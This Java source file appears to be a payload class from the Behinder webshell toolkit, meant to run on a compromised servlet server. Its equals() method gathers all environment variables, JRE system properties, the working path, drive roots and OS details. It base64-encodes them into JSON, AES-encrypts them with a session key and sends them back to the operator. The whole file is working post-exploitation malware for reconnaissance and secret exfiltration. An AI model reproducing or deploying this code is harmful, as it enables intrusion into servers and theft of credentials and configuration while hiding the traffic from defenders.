package net.rebeyond.behinder.payload.java;

import java.io.File;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.Map.Entry;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.jsp.PageContext;

public class BasicInfo {
   public static String whatever;

   public boolean equals(Object obj) {
      PageContext page = (PageContext)obj;
      page.getResponse().setCharacterEncoding("UTF-8");
      String result = "";

      try {
         StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
         Map env = System.getenv();
         Iterator var6 = env.keySet().iterator();

         while(var6.hasNext()) {
            String name = (String)var6.next();
            basicInfo.append(name + "=" + (String)env.get(name) + "<br/>");
         }

         basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
         Properties props = System.getProperties();
         Set entrySet = props.entrySet();
         Iterator var8 = entrySet.iterator();

         while(var8.hasNext()) {
            Entry entry = (Entry)var8.next();
            basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
         }

         String currentPath = (new File("")).getAbsolutePath();
         String driveList = "";
         File[] roots = File.listRoots();
         File[] var11 = roots;
         int var12 = roots.length;

         for(int var13 = 0; var13 < var12; ++var13) {
            File f = var11[var13];
            driveList = driveList + f.getPath() + ";";
         }

         String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
         Map entity = new HashMap();
         entity.put("basicInfo", basicInfo.toString());
         entity.put("currentPath", currentPath);
         entity.put("driveList", driveList);
         entity.put("osInfo", osInfo);
         result = this.buildJson(entity, true);
         String key = page.getSession().getAttribute("u").toString();
         ServletOutputStream so = page.getResponse().getOutputStream();
         so.write(Encrypt(result.getBytes(), key));
         so.flush();
         so.close();
         page.getOut().clear();
      } catch (Exception var15) {
         var15.printStackTrace();
      }

      return true;
   }

   public static byte[] Encrypt(byte[] bs, String key) throws Exception {
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      sb.setLength(sb.length() - 1);
      sb.append("}");
      return sb.toString();
   }
}
